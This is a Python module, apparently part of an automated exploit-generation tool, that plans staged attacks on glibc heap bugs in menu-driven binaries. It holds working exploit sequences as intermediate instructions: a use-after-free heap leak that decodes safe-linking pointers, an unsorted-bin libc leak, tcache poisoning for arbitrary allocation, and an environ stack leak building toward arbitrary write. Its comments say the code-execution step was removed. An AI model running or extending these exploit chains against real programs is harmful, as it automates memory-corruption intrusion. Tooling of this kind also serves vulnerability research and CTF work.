import os
import json
from enum import Enum
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field

from core.analysis.environment import Environment
from core.state.heap_state import AbstractHeapState
from core.state.invariants import HeapInvariant
from core.capabilities.models import Capability, CapabilityDemand, ExploitTarget
from core.capabilities.deriver import CapabilityDeriver
from core.graph.graph import CapabilityGraph
from core.graph.edges import TechniqueEdge
from core.analysis.bug_detector import DetectedBugs
from core.planner.technique_ir_gen import TechniqueIRGenerator, IRContext


class ExploitMode(Enum):
    PRIMITIVES_ONLY = "primitives"
    FULL_EXPLOIT = "full"


@dataclass
class ExploitStage:
    name: str
    technique_id: str
    produces: List[str]
    ir: List[dict] = field(default_factory=list)
    params: Dict[str, Any] = field(default_factory=dict)
    kb_confidence: float = 0.0
    how2heap_sources: List[str] = field(default_factory=list)


@dataclass
class ExploitPlan:
    target: ExploitTarget
    stages: List[ExploitStage]
    path: List[TechniqueEdge]
    confidence: float = 0.5
    metadata: Dict[str, Any] = field(default_factory=dict)
    diagnosis: Dict[str, str] = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "target": {
                "name": self.target.name,
                "address_expr": self.target.address_expr,
                "exploit_type": self.target.exploit_type,
            },
            "stages": [
                {
                    "name": s.name,
                    "technique": s.technique_id,
                    "produces": s.produces,
                    "ir": s.ir,
                    "params": s.params,
                    "kb_confidence": s.kb_confidence,
                    "how2heap_sources": s.how2heap_sources,
                }
                for s in self.stages
            ],
            "confidence": self.confidence,
            "metadata": self.metadata,
            "diagnosis": self.diagnosis,
        }


# Primitives we always try to achieve in PRIMITIVES_ONLY mode
PRIMITIVE_CHAIN = [
    {
        "primitive": "heap_leak",
        "description": "leak_heap",
        "needs_caps": [],
        "required_by": [],
    },
    {
        "primitive": "libc_leak",
        "description": "leak_libc",
        "needs_caps": [],
        "required_by": ["stack_leak"],
    },
    {
        "primitive": "stack_leak",
        "description": "leak_stack",
        "needs_caps": ["libc_leak"],
        "required_by": ["arbitrary_write"],
    },
    {
        "primitive": "arbitrary_write",
        "description": "write_arbitrary",
        "needs_caps": ["libc_leak", "stack_leak"],
        "required_by": [],
    },
]


class ConstraintPlanner:
    def __init__(self,
                 graph: Optional[CapabilityGraph] = None,
                 kb: Any = None,
                 mode: ExploitMode = ExploitMode.PRIMITIVES_ONLY):
        self.graph = graph or CapabilityGraph()
        self.kb = kb
        self.mode = mode

    def _build_metadata(self, env: Environment) -> dict:
        ops = env.interface_map.get("operations", {})
        choices = {}
        for ch, info in ops.items():
            role = info.get("role", "")
            choices[role] = ch
        return {
            "glibc_version": env.glibc_version,
            "has_safe_linking": env.safe_linking,
            "max_slots": env.max_slots,
            "menu_prompt": env.menu_prompt,
            "alloc_choice": choices.get("alloc", "1"),
            "free_choice": choices.get("free", "2"),
            "view_choice": choices.get("view", "3"),
            "edit_choice": choices.get("edit", "4"),
            "exit_choice": choices.get("exit", "0") or "0",
            "libc_path": env.libc_path or "",
            "binary_path": env.binary_path,
        }

    def plan(self, initial_state: AbstractHeapState,
             bugs: DetectedBugs,
             caps: List[Capability],
             env: Environment) -> Optional[ExploitPlan]:
        if self.mode == ExploitMode.PRIMITIVES_ONLY:
            return self._plan_primitives(initial_state, bugs, caps, env)
        else:
            return self._plan_full(initial_state, bugs, caps, env)

    # ─── Primitives-Only Planning ───────────────────────────────────────

    def _plan_primitives(self, state: AbstractHeapState,
                         bugs: DetectedBugs,
                         caps: List[Capability],
                         env: Environment) -> Optional[ExploitPlan]:
        meta = self._build_metadata(env)

        # Step 1: Initial KB query
        kb_matches = self._query_kb(bugs, caps, env)

        if not kb_matches:
            return self._no_knowledge_plan(env, meta)

        # Step 2: For each primitive in the chain, find best KB technique
        # derived_caps: from CapabilityDeriver (what's POSSIBLE from tags)
        # achieved_caps: from actually generated stages (what was DONE)
        # KB matching uses derived_caps ∪ achieved_caps; prerequisite check uses achieved_caps only
        stages = []
        diagnosis = {}
        derived_caps = set(c.name for c in caps)
        achieved_caps = set()

        for step in PRIMITIVE_CHAIN:
            primitive = step["primitive"]
            description = step["description"]
            needs = step["needs_caps"]

            # Check if prerequisites are met
            missing_prereqs = [n for n in needs if n not in achieved_caps]
            if missing_prereqs:
                if missing_prereqs[0] in self._known_missing(stages):
                    diagnosis[primitive] = (
                        f"skipped: prerequisite '{missing_prereqs[0]}' not achieved"
                    )
                continue

            # Re-query KB with derived + accumulated caps
            all_known_caps = derived_caps | achieved_caps
            current_matches = self._query_kb_with_caps(bugs, all_known_caps, env)

            tid = TechniqueIRGenerator.best_technique_for_primitive(current_matches, primitive)
            if tid is None:
                diagnosis[primitive] = (
                    f"no technique found in KB for primitive '{primitive}' "
                    f"(bugs={list(bugs.names())}, caps={list(achieved_caps)}, "
                    f"glibc={env.glibc_version})"
                )
                continue

            feasible, reason = self._check_interface_feasibility(tid, env)
            if not feasible:
                diagnosis[primitive] = f"skipped: {reason}"
                continue

            # Get KB match confidence for this technique
            kb_conf = next(
                (m["confidence"] for m in current_matches if m.get("technique_id") == tid),
                0.0,
            )

            # Generate IR
            ctx = IRContext(
                env=env,
                state=state,
                slot_budget=env.max_slots,
                existing_tags=state.tags,
                libc_auto_offset=0,  # computed later by codegen
            )
            gen = TechniqueIRGenerator(ctx)
            ir = gen.generate(tid)

            if ir is None:
                diagnosis[primitive] = (
                    f"technique '{tid}' is known but IR not implemented"
                )
                continue

            # Find how2heap sources for hints
            sources = TechniqueIRGenerator.get_how2heap_sources(tid, env.glibc_version)

            stage = ExploitStage(
                name=description,
                technique_id=tid,
                produces=[primitive],
                ir=ir,
                kb_confidence=kb_conf,
                how2heap_sources=sources,
            )
            stages.append(stage)
            achieved_caps.add(primitive)
            # Also add implicit primitives (e.g., double-free provides arbitrary_allocation)
            for imp in step.get("also_produces", []):
                achieved_caps.add(imp)
                stage.produces.append(imp)

        if not stages:
            # Nothing generated — return diagnosis
            return ExploitPlan(
                target=ExploitTarget(
                    name="primitives_only",
                    address_expr="none",
                    required_demand=CapabilityDemand("heap_leak"),
                    risk=0.0,
                    exploit_type="primitives",
                ),
                stages=[],
                path=[],
                confidence=0.0,
                metadata=meta,
                diagnosis=diagnosis,
            )

        avg_conf = sum(s.kb_confidence for s in stages) / max(len(stages), 1)
        return ExploitPlan(
            target=ExploitTarget(
                name="primitives_only",
                address_expr="none",
                required_demand=CapabilityDemand(
                    stages[-1].produces[0] if stages[-1].produces else "heap_leak",
                ),
                risk=0.0,
                exploit_type="primitives",
            ),
            stages=stages,
            path=[],
            confidence=min(1.0, avg_conf),
            metadata=meta,
            diagnosis=diagnosis,
        )

    def _query_kb(self, bugs: DetectedBugs, caps: List[Capability],
                  env: Environment) -> List[dict]:
        """Query KB for all matching techniques."""
        if self.kb is None:
            return []
        bugs_list = list(bugs.names())
        caps_list = [c.name for c in caps]
        ops_list = sorted(env.available_ops)
        return self.kb.match_techniques(
            target_glibc_version=env.glibc_version,
            detected_bugs=bugs_list,
            detected_capabilities=caps_list,
            available_ops=ops_list,
        )

    def _query_kb_with_caps(self, bugs: DetectedBugs,
                            achieved_caps: Set[str],
                            env: Environment) -> List[dict]:
        """Query KB with updated capability set (string names, not Capability objects)."""
        if self.kb is None:
            return []
        bugs_list = list(bugs.names())
        caps_list = list(achieved_caps)
        ops_list = sorted(env.available_ops)
        return self.kb.match_techniques(
            target_glibc_version=env.glibc_version,
            detected_bugs=bugs_list,
            detected_capabilities=caps_list,
            available_ops=ops_list,
        )

    def _known_missing(self, stages: List[ExploitStage]) -> Set[str]:
        """Primitives that were attempted but failed to generate."""
        return set()  # Track none by default, reported via diagnosis

    def _check_interface_feasibility(self, tid: str, env: Environment) -> tuple:
        """Check if technique is feasible given the binary's interface operations.
        Returns (True, "") or (False, "reason").
        """
        ops = env.interface_map.get("operations", {})
        available = env.available_ops

        # unsortedbin_leak now has TWO paths:
        # 1. Direct large alloc (needs size param) — _ir_libc_leak_unsorted
        # 2. Fake chunk size via tcache poison (needs arbitrary_allocation) — _ir_libc_leak_fake_size
        # Let the technique_ir_gen decide which path based on context.

        if tid == "environ_leak":
            if "edit" not in available:
                return (False, "environ_leak requires edit on freed chunk, but edit is missing from available_ops")

        if tid == "tcache_poisoning":
            if "free" not in available and "edit" not in available:
                return (False, "tcache_poisoning requires free and edit operations, but they are missing from available_ops")
            elif "free" not in available:
                return (False, "tcache_poisoning requires free operation, but free is missing from available_ops")
            elif "edit" not in available:
                return (False, "tcache_poisoning requires edit operation, but edit is missing from available_ops")

        return (True, "")

    def _no_knowledge_plan(self, env: Environment, meta: dict) -> ExploitPlan:
        """Return an empty plan with diagnosis when KB has no matches."""
        return ExploitPlan(
            target=ExploitTarget(
                name="primitives_only",
                address_expr="none",
                required_demand=CapabilityDemand("heap_leak"),
                risk=0.0,
                exploit_type="primitives",
            ),
            stages=[],
            path=[],
            confidence=0.0,
            metadata=meta,
            diagnosis={
                "global": (
                    f"no technique matched in KB for this environment "
                    f"(glibc={env.glibc_version})"
                ),
            },
        )

    # ─── Full Exploit Mode (preserved for future, code exec removed) ───

    def _plan_full(self, state: AbstractHeapState,
                   bugs: DetectedBugs,
                   caps: List[Capability],
                   env: Environment) -> Optional[ExploitPlan]:
        targets = self._discover_targets(env, caps)
        if not targets:
            return None

        for target in targets:
            plan = self._plan_for_target(state, bugs, caps, target, env)
            if plan:
                return plan

        return None

    def _discover_targets(self, env: Environment,
                           caps: List[Capability]) -> List[ExploitTarget]:
        from core.analysis.target_discovery import TargetDiscovery
        mode_str = "primitives" if self.mode == ExploitMode.PRIMITIVES_ONLY else "full"
        return TargetDiscovery.discover(env.binary_path, env.libc_path, caps, env, mode=mode_str)

    def _plan_for_target(self, state: AbstractHeapState,
                          bugs: DetectedBugs,
                          caps: List[Capability],
                          target: ExploitTarget,
                          env: Environment) -> Optional[ExploitPlan]:
        path = []
        has_core_demand = any(target.required_demand.satisfied_by(c) for c in caps)
        if not has_core_demand:
            path = self.graph.find_path(
                state, bugs.names(), caps, target.required_demand
            )
            if not path:
                return None
            new_caps = caps[:]
            for edge in path:
                new_caps.extend(edge.post_caps)
        else:
            new_caps = caps

        stages = self._build_full_stages(path, new_caps, target, env, state)
        if not stages:
            return None

        confidence = 1.0 / (1.0 + sum(e.cost for e in path) + target.risk)
        return ExploitPlan(
            target=target,
            stages=stages,
            path=path,
            confidence=min(1.0, confidence),
            metadata=self._build_metadata(env),
        )

    def _build_full_stages(self, path: List[TechniqueEdge],
                           existing_caps: List[Capability],
                           target: ExploitTarget,
                           env: Environment,
                           state: AbstractHeapState) -> List[ExploitStage]:
        stages = []

        stages.append(self._stage_heap_leak(env, state))
        if target.requires_libc_leak:
            stages.append(self._stage_libc_leak(env, state))
        stages.append(self._stage_arbitrary_alloc(env, state))
        if target.requires_stack_leak:
            stages.append(self._stage_stack_leak(env, target))

        return stages

    # ─── Legacy Stage Methods (used by FULL_EXPLOIT mode only) ──────────

    def _stage_heap_leak(self, env: Environment, state: AbstractHeapState) -> ExploitStage:
        ir = [
            {"op": "ALLOC", "tag": "c0", "size": 0x40,
             "data_expr": "b'A' * 0x40"},
            {"op": "ALLOC", "tag": "c1", "size": 0x40,
             "data_expr": "b'B' * 0x40"},
            {"op": "FREE", "tag": "c0"},
            {"op": "VIEW", "tag": "c0",
             "save_as": "xor_key",
             "note": "read_first_8_bytes_fd_xor"},
            {"op": "CALC", "var": "heap_base",
             "expr": "xor_key << 12"},
        ]
        return ExploitStage(
            name="leak_heap",
            technique_id="uaf_view_heap_leak",
            produces=["heap_leak"],
            ir=ir,
        )

    def _stage_libc_leak(self, env: Environment, state: AbstractHeapState) -> ExploitStage:
        ir = [
            {"op": "FREE", "tag": "c1"},
            {"op": "ALLOC", "tag": "f0", "size": 0x400, "data_expr": "b'C' * 0x400"},
            {"op": "ALLOC", "tag": "f1", "size": 0x400, "data_expr": "b'D' * 0x400"},
            {"op": "ALLOC", "tag": "f2", "size": 0x400, "data_expr": "b'E' * 0x400"},
            {"op": "ALLOC", "tag": "f3", "size": 0x400, "data_expr": "b'F' * 0x400"},
            {"op": "ALLOC", "tag": "f4", "size": 0x400, "data_expr": "b'G' * 0x400"},
            {"op": "ALLOC", "tag": "f5", "size": 0x400, "data_expr": "b'H' * 0x400"},
            {"op": "ALLOC", "tag": "f6", "size": 0x400, "data_expr": "b'I' * 0x400"},
            {"op": "ALLOC", "tag": "tgt", "size": 0x400, "data_expr": "b'K' * 0x400"},
            {"op": "ALLOC", "tag": "guard", "size": 0x20, "data_expr": "b'L' * 0x20"},
            {"op": "FREE", "tag": "f0"},
            {"op": "FREE", "tag": "f1"},
            {"op": "FREE", "tag": "f2"},
            {"op": "FREE", "tag": "f3"},
            {"op": "FREE", "tag": "f4"},
            {"op": "FREE", "tag": "f5"},
            {"op": "FREE", "tag": "f6"},
            {"op": "FREE", "tag": "tgt"},
            {"op": "VIEW", "tag": "tgt",
             "save_as": "libc_leak",
             "note": "read_first_8_bytes_libc_fd"},
            {"op": "CALC", "var": "libc.address",
             "expr": "libc_leak - LIBC_AUTO_OFFSET"},
        ]
        return ExploitStage(
            name="leak_libc",
            technique_id="uaf_view_libc_leak",
            produces=["libc_leak"],
            ir=ir,
        )

    def _stage_arbitrary_alloc(self, env: Environment,
                                 state: AbstractHeapState) -> ExploitStage:
        has_sl = env.safe_linking
        ir = [
            {"op": "ALLOC", "tag": "victim", "size": 0x40,
             "data_expr": "b'V' * 0x40"},
            {"op": "ALLOC", "tag": "arb_guard", "size": 0x40,
             "data_expr": "b'G' * 0x40"},
            {"op": "FREE", "tag": "victim"},
        ]
        if has_sl:
            ir.append({
                "op": "POISON_FD", "tag": "victim",
                "pos": "heap_base + TARGET_OFFSET",
                "target": "SELF"})
        else:
            ir.append({
                "op": "EDIT", "tag": "victim",
                "data_expr": "p64(TARGET_OFFSET)"})
        ir.append({"op": "ALLOC", "tag": "d1", "size": 0x40,
                    "data_expr": "b'X' * 0x40"})
        return ExploitStage(
            name="arbitrary_alloc",
            technique_id="tcache_poison_arbitrary_alloc",
            produces=["arbitrary_allocation"],
            ir=ir,
        )

    def _stage_stack_leak(self, env: Environment,
                           target: ExploitTarget) -> ExploitStage:
        has_sl = env.safe_linking
        ir = [
            {"op": "CALC", "var": "_environ_addr",
             "expr": "libc.symbols['environ']"},
            {"op": "CALC", "var": "_environ_target",
             "expr": "_environ_addr - (_environ_addr & 0xf)"},
            {"op": "FREE", "tag": "d1"},
            {"op": "FREE", "tag": "arb_guard"},
        ]
        if has_sl:
            ir.append({
                "op": "EDIT", "tag": "arb_guard",
                "data_expr": "p64(_environ_target ^ ((heap_base + STACK_POS_OFFSET) >> 12))",
            })
        else:
            ir.append({
                "op": "EDIT", "tag": "arb_guard",
                "data_expr": "p64(_environ_target)",
            })
        ir += [
            {"op": "ALLOC", "tag": "fille", "size": 0x40,
             "data_expr": "b'E' * 0x40"},
            {"op": "ALLOC", "tag": "env_chunk", "size": 0x40,
             "data_expr": "b'Z'"},
            {"op": "VIEW", "tag": "env_chunk",
             "save_as": "stack_leak",
             "note": "read_first_8_bytes"},
        ]
        return ExploitStage(
            name="leak_stack",
            technique_id="environ_leak",
            produces=["stack_leak"],
            ir=ir,
        )
